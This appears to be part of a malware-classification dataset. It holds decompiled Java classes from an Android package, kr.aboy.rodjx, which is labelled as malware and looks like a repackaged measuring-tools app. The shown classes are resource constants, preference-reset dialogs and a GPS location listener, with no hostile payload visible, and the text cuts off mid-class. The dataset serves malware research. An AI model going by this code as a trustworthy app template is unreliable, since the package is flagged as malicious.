"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\af.code","public final class af {   public static final int A=2131099649;   public static final int B=2131099655;   public static final int C=2131099673;   public static final int D=2131099669;   public static final int E=2131099653;   public static final int F=2131099685;   public static final int G=2131099663;   public static final int H=2131099661;   public static final int I=2131099651;   public static final int J=2131099657;   public static final int K=2131099659;   public static final int L=2131099667;   public static final int M=2131099665;   public static final int N=2131099671;   public static final int f349a=2131099686;   public static final int f350b=2131099682;   public static final int c=2131099680;   public static final int d=2131099676;   public static final int e=2131099678;   public static final int f=2131099674;   public static final int g=2131099648;   public static final int h=2131099654;   public static final int i=2131099672;   public static final int j=2131099668;   public static final int k=2131099652;   public static final int l=2131099684;   public static final int m=2131099662;   public static final int n=2131099660;   public static final int o=2131099650;   public static final int p=2131099656;   public static final int q=2131099658;   public static final int r=2131099666;   public static final int s=2131099664;   public static final int t=2131099670;   public static final int u=2131099687;   public static final int v=2131099683;   public static final int w=2131099681;   public static final int x=2131099677;   public static final int y=2131099679;   public static final int z=2131099675; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\ag.code","public final class ag { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\ah.code","public final class ah {   public static final int f351a=2131165188;   public static final int f352b=2131165186;   public static final int c=2131165185;   public static final int d=2131165192;   public static final int e=2131165189;   public static final int f=2131165190;   public static final int g=2131165191;   public static final int h=2131165193;   public static final int i=2131165194;   public static final int j=2131165184;   public static final int k=2131165187; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\ai.code","public final class ai {   public static final int A=2130837530;   public static final int B=2130837531;   public static final int C=2130837532;   public static final int D=2130837533;   public static final int E=2130837534;   public static final int F=2130837535;   public static final int G=2130837536;   public static final int H=2130837537;   public static final int I=2130837538;   public static final int J=2130837539;   public static final int K=2130837540;   public static final int L=2130837541;   public static final int M=2130837542;   public static final int N=2130837543;   public static final int O=2130837544;   public static final int P=2130837545;   public static final int Q=2130837546;   public static final int R=2130837547;   public static final int S=2130837548;   public static final int T=2130837549;   public static final int U=2130837550;   public static final int V=2130837551;   public static final int W=2130837552;   public static final int X=2130837553;   public static final int Y=2130837554;   public static final int Z=2130837555;   public static final int f353a=2130837504;   public static final int aA=2130837582;   public static final int aB=2130837583;   public static final int aC=2130837584;   public static final int aD=2130837585;   public static final int aE=2130837586;   public static final int aF=2130837587;   public static final int aG=2130837588;   public static final int aH=2130837589;   public static final int aI=2130837590;   public static final int aJ=2130837591;   public static final int aK=2130837592;   public static final int aL=2130837593;   public static final int aM=2130837594;   public static final int aN=2130837595;   public static final int aO=2130837596;   public static final int aP=2130837597;   public static final int aQ=2130837598;   public static final int aR=2130837599;   public static final int aS=2130837600;   public static final int aT=2130837601;   public static final int aU=2130837602;   public static final int aV=2130837603;   public static final int aW=2130837604;   public static final int aX=2130837605;   public static final int aY=2130837606;   public static final int aZ=2130837607;   public static final int aa=2130837556;   public static final int ab=2130837557;   public static final int ac=2130837558;   public static final int ad=2130837559;   public static final int ae=2130837560;   public static final int af=2130837561;   public static final int ag=2130837562;   public static final int ah=2130837563;   public static final int ai=2130837564;   public static final int aj=2130837565;   public static final int ak=2130837566;   public static final int al=2130837567;   public static final int am=2130837568;   public static final int an=2130837569;   public static final int ao=2130837570;   public static final int ap=2130837571;   public static final int aq=2130837572;   public static final int ar=2130837573;   public static final int as=2130837574;   public static final int at=2130837575;   public static final int au=2130837576;   public static final int av=2130837577;   public static final int aw=2130837578;   public static final int ax=2130837579;   public static final int ay=2130837580;   public static final int az=2130837581;   public static final int f354b=2130837505;   public static final int bA=2130837634;   public static final int bB=2130837635;   public static final int bC=2130837636;   public static final int bD=2130837637;   public static final int bE=2130837638;   public static final int bF=2130837639;   public static final int bG=2130837640;   public static final int bH=2130837641;   public static final int bI=2130837642;   public static final int bJ=2130837643;   public static final int bK=2130837644;   public static final int bL=2130837645;   public static final int bM=2130837646;   public static final int bN=2130837647;   public static final int bO=2130837648;   public static final int bP=2130837649;   public static final int bQ=2130837650;   public static final int bR=2130837651;   public static final int bS=2130837652;   public static final int bT=2130837653;   public static final int bU=2130837654;   public static final int bV=2130837655;   public static final int bW=2130837656;   public static final int bX=2130837657;   public static final int bY=2130837658;   public static final int bZ=2130837659;   public static final int ba=2130837608;   public static final int bb=2130837609;   public static final int bc=2130837610;   public static final int bd=2130837611;   public static final int be=2130837612;   public static final int bf=2130837613;   public static final int bg=2130837614;   public static final int bh=2130837615;   public static final int bi=2130837616;   public static final int bj=2130837617;   public static final int bk=2130837618;   public static final int bl=2130837619;   public static final int bm=2130837620;   public static final int bn=2130837621;   public static final int bo=2130837622;   public static final int bp=2130837623;   public static final int bq=2130837624;   public static final int br=2130837625;   public static final int bs=2130837626;   public static final int bt=2130837627;   public static final int bu=2130837628;   public static final int bv=2130837629;   public static final int bw=2130837630;   public static final int bx=2130837631;   public static final int by=2130837632;   public static final int bz=2130837633;   public static final int c=2130837506;   public static final int ca=2130837660;   public static final int cb=2130837661;   public static final int cc=2130837662;   public static final int cd=2130837663;   public static final int ce=2130837664;   public static final int cf=2130837665;   public static final int cg=2130837666;   public static final int ch=2130837667;   public static final int ci=2130837668;   public static final int cj=2130837669;   public static final int ck=2130837670;   public static final int cl=2130837671;   public static final int cm=2130837672;   public static final int cn=2130837673;   public static final int co=2130837674;   public static final int cp=2130837675;   public static final int cq=2130837676;   public static final int cr=2130837677;   public static final int cs=2130837678;   public static final int ct=2130837679;   public static final int cu=2130837680;   public static final int cv=2130837681;   public static final int cw=2130837682;   public static final int cx=2130837683;   public static final int d=2130837507;   public static final int e=2130837508;   public static final int f=2130837509;   public static final int g=2130837510;   public static final int h=2130837511;   public static final int i=2130837512;   public static final int j=2130837513;   public static final int k=2130837514;   public static final int l=2130837515;   public static final int m=2130837516;   public static final int n=2130837517;   public static final int o=2130837518;   public static final int p=2130837519;   public static final int q=2130837520;   public static final int r=2130837521;   public static final int s=2130837522;   public static final int t=2130837523;   public static final int u=2130837524;   public static final int v=2130837525;   public static final int w=2130837526;   public static final int x=2130837527;   public static final int y=2130837528;   public static final int z=2130837529; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\aj.code","public final class aj {   public static final int A=2131296257;   public static final int B=2131296371;   public static final int C=2131296268;   public static final int D=2131296350;   public static final int E=2131296283;   public static final int F=2131296299;   public static final int G=2131296306;   public static final int H=2131296259;   public static final int I=2131296269;   public static final int J=2131296272;   public static final int K=2131296319;   public static final int L=2131296314;   public static final int M=2131296323;   public static final int N=2131296316;   public static final int O=2131296320;   public static final int P=2131296312;   public static final int Q=2131296313;   public static final int R=2131296311;   public static final int S=2131296261;   public static final int T=2131296326;   public static final int U=2131296327;   public static final int V=2131296305;   public static final int W=2131296307;   public static final int X=2131296262;   public static final int Y=2131296308;   public static final int Z=2131296310;   public static final int f355a=2131296287;   public static final int aA=2131296298;   public static final int aB=2131296302;   public static final int aC=2131296362;   public static final int aD=2131296363;   public static final int aE=2131296309;   public static final int aF=2131296315;   public static final int aG=2131296318;   public static final int aH=2131296324;   public static final int aI=2131296322;   public static final int aJ=2131296365;   public static final int aK=2131296366;   public static final int aL=2131296282;   public static final int aM=2131296351;   public static final int aN=2131296279;   public static final int aO=2131296280;   public static final int aP=2131296267;   public static final int aQ=2131296349;   public static final int aR=2131296256;   public static final int aS=2131296354;   public static final int aT=2131296355;   public static final int aU=2131296357;   public static final int aV=2131296358;   public static final int aW=2131296359;   public static final int aX=2131296360;   public static final int aY=2131296352;   public static final int aZ=2131296353;   public static final int aa=2131296330;   public static final int ab=2131296331;   public static final int ac=2131296271;   public static final int ad=2131296333;   public static final int ae=2131296332;   public static final int af=2131296340;   public static final int ag=2131296343;   public static final int ah=2131296346;   public static final int ai=2131296274;   public static final int aj=2131296334;   public static final int ak=2131296356;   public static final int al=2131296317;   public static final int am=2131296285;   public static final int an=2131296289;   public static final int ao=2131296276;   public static final int ap=2131296337;   public static final int aq=2131296338;   public static final int ar=2131296339;   public static final int as=2131296325;   public static final int at=2131296321;   public static final int au=2131296361;   public static final int av=2131296335;   public static final int aw=2131296336;   public static final int ax=2131296364;   public static final int ay=2131296367;   public static final int az=2131296328;   public static final int f356b=2131296288;   public static final int ba=2131296258;   public static final int bb=2131296281;   public static final int bc=2131296370;   public static final int bd=2131296293;   public static final int be=2131296329;   public static final int bf=2131296368;   public static final int bg=2131296369;   public static final int bh=2131296372;   public static final int bi=2131296297;   public static final int bj=2131296270;   public static final int bk=2131296273;   public static final int bl=2131296266;   public static final int bm=2131296296;   public static final int c=2131296286;   public static final int d=2131296301;   public static final int e=2131296304;   public static final int f=2131296277;   public static final int g=2131296278;   public static final int h=2131296348;   public static final int i=2131296295;   public static final int j=2131296344;   public static final int k=2131296300;   public static final int l=2131296347;   public static final int m=2131296264;   public static final int n=2131296342;   public static final int o=2131296294;   public static final int p=2131296341;   public static final int q=2131296263;   public static final int r=2131296303;   public static final int s=2131296345;   public static final int t=2131296292;   public static final int u=2131296290;   public static final int v=2131296291;   public static final int w=2131296284;   public static final int x=2131296265;   public static final int y=2131296275;   public static final int z=2131296260; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\ak.code","public final class ak {   public static final int A=2130903066;   public static final int f357a=2130903040;   public static final int f358b=2130903041;   public static final int c=2130903042;   public static final int d=2130903043;   public static final int e=2130903044;   public static final int f=2130903045;   public static final int g=2130903046;   public static final int h=2130903047;   public static final int i=2130903048;   public static final int j=2130903049;   public static final int k=2130903050;   public static final int l=2130903051;   public static final int m=2130903052;   public static final int n=2130903053;   public static final int o=2130903054;   public static final int p=2130903055;   public static final int q=2130903056;   public static final int r=2130903057;   public static final int s=2130903058;   public static final int t=2130903059;   public static final int u=2130903060;   public static final int v=2130903061;   public static final int w=2130903062;   public static final int x=2130903063;   public static final int y=2130903064;   public static final int z=2130903065; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\al.code","public final class al {   public static final int f359a=2131034112;   public static final int f360b=2131034113;   public static final int c=2131034114;   public static final int d=2131034115;   public static final int e=2131034116; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\am.code","public final class am {   public static final int A=2131230926;   public static final int B=2131230800;   public static final int C=2131230751;   public static final int D=2131230757;   public static final int E=2131230998;   public static final int F=2131230999;   public static final int G=2131231000;   public static final int H=2131231001;   public static final int I=2131231002;   public static final int J=2131230990;   public static final int K=2131230991;   public static final int L=2131230992;   public static final int M=2131230993;   public static final int N=2131230994;   public static final int O=2131230995;   public static final int P=2131230996;   public static final int Q=2131230997;   public static final int R=2131230739;   public static final int S=2131230731;   public static final int T=2131230794;   public static final int U=2131230792;   public static final int V=2131230793;   public static final int W=2131230791;   public static final int X=2131230871;   public static final int Y=2131230790;   public static final int Z=2131230870;   public static final int f361a=2131230752;   public static final int aA=2131230858;   public static final int aB=2131230919;   public static final int aC=2131231045;   public static final int aD=2131231052;   public static final int aE=2131230980;   public static final int aF=2131230865;   public static final int aG=2131230922;   public static final int aH=2131230979;   public static final int aI=2131230864;   public static final int aJ=2131230921;   public static final int aK=2131230866;   public static final int aL=2131230981;   public static final int aM=2131230867;   public static final int aN=2131230923;   public static final int aO=2131231047;   public static final int aP=2131230964;   public static final int aQ=2131230965;   public static final int aR=2131230788;   public static final int aS=2131231018;   public static final int aT=2131230868;   public static final int aU=2131230927;   public static final int aV=2131230928;   public static final int aW=2131230929;   public static final int aX=2131230749;   public static final int aY=2131230745;   public static final int aZ=2131230748;   public static final int aa=2131230789;   public static final int ab=2131230869;   public static final int ac=2131230783;   public static final int ad=2131230756;   public static final int ae=2131230784;   public static final int af=2131230914;   public static final int ag=2131230976;   public static final int ah=2131230857;   public static final int ai=2131230918;   public static final int aj=2131231044;   public static final int ak=2131231051;   public static final int al=2131230975;   public static final int am=2131230856;   public static final int an=2131230917;   public static final int ao=2131231043;   public static final int ap=2131231050;   public static final int aq=2131230978;   public static final int ar=2131230920;   public static final int as=2131231046;   public static final int at=2131231053;   public static final int au=2131230859;   public static final int av=2131230860;   public static final int aw=2131230861;   public static final int ax=2131230862;   public static final int ay=2131230863;   public static final int az=2131230977;   public static final int f362b=2131230780;   public static final int bA=2131230760;   public static final int bB=2131230761;   public static final int bC=2131231016;   public static final int bD=2131230763;   public static final int bE=2131230762;   public static final int bF=2131230776;   public static final int bG=2131230933;   public static final int bH=2131230755;   public static final int bI=2131230742;   public static final int bJ=2131230732;   public static final int bK=2131230733;   public static final int bL=2131230736;   public static final int bM=2131230738;   public static final int bN=2131230734;   public static final int bO=2131230735;   public static final int bP=2131230737;   public static final int bQ=2131231048;   public static final int bR=2131230851;   public static final int bS=2131230850;   public static final int bT=2131230915;   public static final int bU=2131230849;   public static final int bV=2131230852;   public static final int bW=2131230853;   public static final int bX=2131230916;   public static final int bY=2131230854;   public static final int bZ=2131230974;   public static final int ba=2131230744;   public static final int bb=2131230743;   public static final int bc=2131230746;   public static final int bd=2131230747;   public static final int be=2131230758;   public static final int bf=2131230930;   public static final int bg=2131230931;   public static final int bh=2131230932;   public static final int bi=2131230924;   public static final int bj=2131230986;   public static final int bk=2131230987;   public static final int bl=2131230771;   public static final int bm=2131230769;   public static final int bn=2131230773;   public static final int bo=2131230766;   public static final int bp=2131230787;   public static final int bq=2131230759;   public static final int br=2131230768;   public static final int bs=2131230772;   public static final int bt=2131230764;   public static final int bu=2131230765;   public static final int bv=2131230767;   public static final int bw=2131230774;   public static final int bx=2131231017;   public static final int by=2131230770;   public static final int bz=2131230775;   public static final int c=2131230781;   public static final int cA=2131230937;   public static final int cB=2131230938;   public static final int cC=2131230936;   public static final int cD=2131230801;   public static final int cE=2131230882;   public static final int cF=2131231029;   public static final int cG=2131230945;   public static final int cH=2131230807;   public static final int cI=2131230893;   public static final int cJ=2131231036;   public static final int cK=2131230954;   public static final int cL=2131230812;   public static final int cM=2131230901;   public static final int cN=2131230959;   public static final int cO=2131230906;   public static final int cP=2131230909;   public static final int cQ=2131230950;   public static final int cR=2131230951;   public static final int cS=2131230960;   public static final int cT=2131230961;   public static final int cU=2131230804;   public static final int cV=2131230805;   public static final int cW=2131231034;   public static final int cX=2131231035;   public static final int cY=2131230819;   public static final int cZ=2131230820;   public static final int ca=2131230848;   public static final int cb=2131230750;   public static final int cc=2131230874;   public static final int cd=2131230855;   public static final int ce=2131230941;   public static final int cf=2131230942;   public static final int cg=2131230952;   public static final int ch=2131230953;   public static final int ci=2131230943;   public static final int cj=2131230944;   public static final int ck=2131230889;   public static final int cl=2131230890;   public static final int cm=2131231041;   public static final int cn=2131231042;   public static final int co=2131230957;   public static final int cp=2131230958;   public static final int cq=2131231039;   public static final int cr=2131231040;   public static final int cs=2131230955;   public static final int ct=2131230956;   public static final int cu=2131231037;   public static final int cv=2131231038;   public static final int cw=2131230904;   public static final int cx=2131230905;   public static final int cy=2131230808;   public static final int cz=2131230809;   public static final int d=2131230782;   public static final int dA=2131230884;   public static final int dB=2131230810;   public static final int dC=2131230811;   public static final int dD=2131231032;   public static final int dE=2131231033;   public static final int dF=2131230887;   public static final int dG=2131230888;   public static final int dH=2131230912;   public static final int dI=2131230913;   public static final int dJ=2131230902;   public static final int dK=2131230903;   public static final int dL=2131230806;   public static final int dM=2131231030;   public static final int dN=2131231031;   public static final int dO=2131230897;   public static final int dP=2131230898;   public static final int dQ=2131230948;   public static final int dR=2131230949;   public static final int dS=2131230815;   public static final int dT=2131230816;   public static final int dU=2131230778;   public static final int dV=2131230779;   public static final int dW=2131230777;   public static final int dX=2131230753;   public static final int dY=2131230988;   public static final int dZ=2131230989;   public static final int da=2131230946;   public static final int db=2131230947;   public static final int dc=2131230817;   public static final int dd=2131230818;   public static final int de=2131230962;   public static final int df=2131230963;   public static final int dg=2131230910;   public static final int dh=2131230911;   public static final int di=2131230899;   public static final int dj=2131230900;   public static final int dk=2131230894;   public static final int dl=2131230896;   public static final int dm=2131230895;   public static final int dn=2131230885;   public static final int f0do=2131230886;   public static final int dp=2131230939;   public static final int dq=2131230940;   public static final int dr=2131230907;   public static final int ds=2131230908;   public static final int dt=2131230802;   public static final int du=2131230803;   public static final int dv=2131230891;   public static final int dw=2131230892;   public static final int dx=2131230813;   public static final int dy=2131230814;   public static final int dz=2131230883;   public static final int e=2131230934;   public static final int eA=2131231025;   public static final int eB=2131231026;   public static final int eC=2131231028;   public static final int eD=2131231023;   public static final int eE=2131231024;   public static final int eF=2131231027;   public static final int eG=2131231019;   public static final int eH=2131231020;   public static final int eI=2131231021;   public static final int eJ=2131231022;   public static final int eK=2131231012;   public static final int eL=2131231013;   public static final int eM=2131231014;   public static final int eN=2131231015;   public static final int eO=2131231003;   public static final int eP=2131231004;   public static final int eQ=2131231005;   public static final int eR=2131231006;   public static final int eS=2131231007;   public static final int eT=2131231008;   public static final int eU=2131231009;   public static final int eV=2131231010;   public static final int eW=2131231011;   public static final int eX=2131230984;   public static final int eY=2131230985;   public static final int eZ=2131230821;   public static final int ea=2131230740;   public static final int eb=2131230754;   public static final int ec=2131230873;   public static final int ed=2131230875;   public static final int ee=2131230841;   public static final int ef=2131230842;   public static final int eg=2131230843;   public static final int eh=2131230844;   public static final int ei=2131230845;   public static final int ej=2131230846;   public static final int ek=2131230880;   public static final int el=2131230877;   public static final int em=2131230878;   public static final int en=2131230879;   public static final int eo=2131230876;   public static final int ep=2131230881;   public static final int eq=2131230972;   public static final int er=2131230966;   public static final int es=2131230969;   public static final int et=2131230973;   public static final int eu=2131230967;   public static final int ev=2131230968;   public static final int ew=2131230970;   public static final int ex=2131230971;   public static final int ey=2131230982;   public static final int ez=2131230983;   public static final int f=2131230872;   public static final int fa=2131230823;   public static final int fb=2131230825;   public static final int fc=2131230822;   public static final int fd=2131230824;   public static final int fe=2131230826;   public static final int ff=2131230827;   public static final int fg=2131230829;   public static final int fh=2131230831;   public static final int fi=2131230828;   public static final int fj=2131230830;   public static final int fk=2131230832;   public static final int fl=2131230833;   public static final int fm=2131230835;   public static final int fn=2131230837;   public static final int fo=2131230834;   public static final int fp=2131230836;   public static final int fq=2131230838;   public static final int fr=2131230839;   public static final int fs=2131230840;   public static final int ft=2131230847;   public static final int fu=2131230741;   public static final int fv=2131230785;   public static final int g=2131230726;   public static final int h=2131230727;   public static final int i=2131230730;   public static final int j=2131230722;   public static final int k=2131230723;   public static final int l=2131230720;   public static final int m=2131230724;   public static final int n=2131230725;   public static final int o=2131230728;   public static final int p=2131230729;   public static final int q=2131230721;   public static final int r=2131230786;   public static final int s=2131231049;   public static final int t=2131230796;   public static final int u=2131230925;   public static final int v=2131230935;   public static final int w=2131230797;   public static final int x=2131230795;   public static final int y=2131230798;   public static final int z=2131230799; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\an.code","public final class an {   public static final int f363a=2130968576;   public static final int f364b=2130968577;   public static final int c=2130968578;   public static final int d=2130968579;   public static final int e=2130968580; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\ao.code","class ao implements DialogInterface.OnClickListener {   final Tools f365a;   public ao(  Tools tools){     this.f365a=tools;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     SharedPreferences sharedPreferences;     boolean z;     sharedPreferences=this.f365a.m;     SharedPreferences.Editor edit=sharedPreferences.edit();     edit.clear();     edit.putBoolean(""smartcheck"",Tools.d);     edit.putInt(""smartcount"",Tools.c);     z=this.f365a.j;     edit.putBoolean(""smartcomment"",z);     edit.commit();     this.f365a.b();     this.f365a.d();     Toast.makeText(this.f365a,this.f365a.getString(C0000R.string.init_ok),0).show();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\ap.code","class ap implements DialogInterface.OnClickListener {   final Tools f366a;   public ap(  Tools tools){     this.f366a=tools;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\array.code","public static final class array {   public static final int entries_calibration=2131099648;   public static final int entryValues_calibration=2131099649;   public static final int entries_measure2nd=2131099650;   public static final int entryValues_measure2nd=2131099651;   public static final int entries_distanceunit=2131099652;   public static final int entryValues_distanceunit=2131099653;   public static final int entries_color=2131099654;   public static final int entryValues_color=2131099655;   public static final int entries_ruler=2131099656;   public static final int entryValues_ruler=2131099657;   public static final int entries_size=2131099658;   public static final int entryValues_size=2131099659;   public static final int entries_lengthunit=2131099660;   public static final int entryValues_lengthunit=2131099661;   public static final int entries_lengthlong=2131099662;   public static final int entryValues_lengthlong=2131099663;   public static final int entries_tiltunit=2131099664;   public static final int entryValues_tiltunit=2131099665;   public static final int entries_threadtype=2131099666;   public static final int entryValues_threadtype=2131099667;   public static final int entries_delay=2131099668;   public static final int entryValues_delay=2131099669;   public static final int entries_viakind=2131099670;   public static final int entryValues_viakind=2131099671;   public static final int entries_coorditype=2131099672;   public static final int entryValues_coorditype=2131099673;   public static final int entries_beeplevel_metal=2131099674;   public static final int entryValues_beeplevel_metal=2131099675;   public static final int entries_beepkind_metal=2131099676;   public static final int entryValues_beepkind_metal=2131099677;   public static final int entries_beeplevel=2131099678;   public static final int entryValues_beeplevel=2131099679;   public static final int entries_beepkind=2131099680;   public static final int entryValues_beepkind=2131099681;   public static final int entries_baseline=2131099682;   public static final int entryValues_baseline=2131099683;   public static final int entries_duration=2131099684;   public static final int entryValues_duration=2131099685;   public static final int entries_azimuth=2131099686;   public static final int entryValues_azimuth=2131099687; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\b.code","public class b {   private static int f367a=0;   private static LocationManager f368b=null;   private static boolean c=true;   private static c[] d={new c(""gps""),new c(""network"")};   public static void a(){     if (f368b == null) {       return;     }     if (f367a == 0) {       try {         f368b.requestLocationUpdates(""gps"",5000L,1.0f,d[0]);       }  catch (      IllegalArgumentException e) {         e.printStackTrace();       } catch (      SecurityException e2) {         e2.printStackTrace();       }       try {         f368b.requestLocationUpdates(""network"",5000L,1.0f,d[1]);       }  catch (      IllegalArgumentException e3) {         e3.printStackTrace();       } catch (      SecurityException e4) {         e4.printStackTrace();       }     }     f367a++;   }   public static void a(  Context context){     if (f368b == null) {       f368b=(LocationManager)context.getSystemService(""location"");     }   }   public static void a(  boolean z){     c=z;   }   public static void b(){     if (f368b == null) {       return;     }     int i=f367a - 1;     f367a=i;     if (i <= 0) {       for (int i2=0; i2 < d.length; i2++) {         try {           f368b.removeUpdates(d[i2]);         }  catch (        Exception e) {           e.printStackTrace();         }       }       f367a=0;     }   }   public static Location c(){     Location location=null;     int length=c ? d.length : 1;     for (int i=0; i < length && location == null; i++) {       location=d[i].a();     }     return location;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\c.code","class c implements LocationListener {   private Location f369a;   private boolean f370b=false;   private String c;   public c(  String str){     this.c=str;     this.f369a=new Location(this.c);   }   public Location a(){     if (this.f370b) {       return this.f369a;     }     return null;   }   @Override public void onLocationChanged(  Location location){     if (location.getLatitude() == 0.0d && location.getLongitude() == 0.0d) {       return;     }     this.f369a.set(location);     this.f370b=true;   }   @Override public void onProviderDisabled(  String str){     this.f370b=false;   }   @Override public void onProviderEnabled(  String str){   }   @Override public void onStatusChanged(  String str,  int i,  Bundle bundle){     if (i == 0) {       this.f370b=false;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx\C0000R.code","public final class C0000R { public static final class drawable {     public static final int back_metal=2130837504;     public static final int back_metal1=2130837505;     public static final int ball1=2130837506;     public static final int ball2=2130837507;     public static final int ball3=2130837508;     public static final int ball4=2130837509;     public static final int ball5=2130837510;     public static final int ball6=2130837511;     public static final int ball7=2130837512;     public static final int ball8=2130837513;     public static final int ball9=2130837514;     public static final int bar_led_all=2130837515;     public static final int bar_screen_off=2130837516;     public static final int bar_screen_on=2130837517;     public static final int bg_flash_off=2130837518;     public static final int bg_flash_on=2130837519;     public static final int bg_screen_off=2130837520;     public static final int bg_screen_on=2130837521;     public static final int border_steal=2130837522;     public static final int bt_sms_send=2130837523;     public static final int button_area=2130837524;     public static final int button_chart=2130837525;     public static final int button_height=2130837526;     public static final int button_pause=2130837527;     public static final int button_play=2130837528;     public static final int button_text=2130837529;     public static final int button_width=2130837530;     public static final int chart_mag=2130837531;     public static final int chart_sound=2130837532;     public static final int cross=2130837533;     public static final int dialog_directions=2130837534;     public static final int email=2130837535;     public static final int flash_widget=2130837536;     public static final int flash_widget_back=2130837537;     public static final int flash_widget_off=2130837538;     public static final int flash_widget_on=2130837539;     public static final int flash_widget_pressed=2130837540;     public static final int go_left=2130837541;     public static final int go_reload=2130837542;     public static final int go_right=2130837543;     public static final int go_scroll=2130837544;     public static final int icon=2130837545;     public static final int icon_compass=2130837546;     public static final int icon_compass_tab=2130837547;     public static final int icon_flashlight=2130837548;     public static final int icon_flashlight_tab=2130837549;     public static final int icon_flashlight_widget=2130837550;     public static final int icon_level=2130837551;     public static final int icon_level_tab=2130837552;     public static final int icon_measure=2130837553;     public static final int icon_measure_tab=2130837554;     public static final int icon_metal=2130837555;     public static final int icon_metal_tab=2130837556;     public static final int icon_protractor2=2130837557;     public static final int icon_protractor2_tab=2130837558;     public static final int icon_protractor3=2130837559;     public static final int icon_protractor3_tab=2130837560;     public static final int icon_ruler=2130837561;     public static final int icon_ruler_tab=2130837562;     public static final int icon_sound=2130837563;     public static final int icon_sound_tab=2130837564;     public static final int icon_vibration=2130837565;     public static final int icon_vibration_tab=2130837566;     public static final int led_off=2130837567;     public static final int led_on=2130837568;     public static final int m_center1=2130837569;     public static final int m_down=2130837570;     public static final int m_down0=2130837571;     public static final int m_down1=2130837572;     public static final int m_up=2130837573;     public static final int m_up0=2130837574;     public static final int m_up1=2130837575;     public static final int main_back_land=2130837576;     public static final int main_back_port=2130837577;     public static final int main_bottom_land=2130837578;     public static final int main_bottom_land_tab=2130837579;     public static final int main_bottom_port=2130837580;     public static final int main_bottom_port_tab=2130837581;     public static final int main_shelf1=2130837582;     public static final int main_shelf1_off=2130837583;     public static final int main_shelf1_on=2130837584;     public static final int main_shelf1_tab=2130837585;     public static final int main_shelf1_tab_off=2130837586;     public static final int main_shelf1_tab_on=2130837587;     public static final int main_shelf2=2130837588;     public static final int main_shelf2_off=2130837589;     public static final int main_shelf2_on=2130837590;     public static final int main_shelf2_tab=2130837591;     public static final int main_shelf2_tab_off=2130837592;     public static final int main_shelf2_tab_on=2130837593;     public static final int main_shelf3=2130837594;     public static final int main_shelf3_off=2130837595;     public static final int main_shelf3_on=2130837596;     public static final int main_shelf3_tab=2130837597;     public static final int main_shelf3_tab_off=2130837598;     public static final int main_shelf3_tab_on=2130837599;     public static final int main_shelf4=2130837600;     public static final int main_shelf4_off=2130837601;     public static final int main_shelf4_on=2130837602;     public static final int main_shelf4_tab=2130837603;     public static final int main_shelf4_tab_off=2130837604;     public static final int main_shelf4_tab_on=2130837605;     public static final int main_shelf5=2130837606;     public static final int main_shelf5_off=2130837607;     public static final int main_shelf5_on=2130837608;     public static final int main_shelf5_tab=2130837609;     public static final int main_shelf5_tab_off=2130837610;     public static final int main_shelf5_tab_on=2130837611;     public static final int menu_add=2130837612;     public static final int menu_calibrate=2130837613;     public static final int menu_compass=2130837614;     public static final int menu_getpro=2130837615;     public static final int menu_help=2130837616;     public static final int menu_home=2130837617;     public static final int menu_info=2130837618;     public static final int menu_init=2130837619;     public static final int menu_input=2130837620;     public static final int menu_metal=2130837621;     public static final int menu_refresh=2130837622;     public static final int menu_remove=2130837623;     public static final int menu_settings=2130837624;     public static final int menu_sound=2130837625;     public static final int menu_sql=2130837626;     public static final int menu_unit=2130837627;     public static final int menu_vibration=2130837628;     public static final int menu_width=2130837629;     public static final int meter_sound=2130837630;     public static final int meter_vib=2130837631;     public static final int needle=2130837632;     public static final int needle_sound=2130837633;     public static final int needle_vib=2130837634;     public static final int num_0=2130837635;     public static final int num_1=2130837636;     public static final int num_2=2130837637;     public static final int num_3=2130837638;     public static final int num_4=2130837639;     public static final int num_5=2130837640;     public static final int num_6=2130837641;     public static final int num_7=2130837642;     public static final int num_8=2130837643;     public static final int num_9=2130837644;     public static final int plumb=2130837645;     public static final int screen_off=2130837646;     public static final int screen_on=2130837647;     public static final int shutter0=2130837648;     public static final int shutter1=2130837649;     public static final int shutter2=2130837650;     public static final int slide_close=2130837651;     public static final int slide_handle_bar=2130837652;     public static final int slide_handle_bar_off=2130837653;     public static final int slide_handle_bar_on=2130837654;     public static final int slide_handle_rect=2130837655;     public static final int slide_handle_rect_off=2130837656;     public static final int 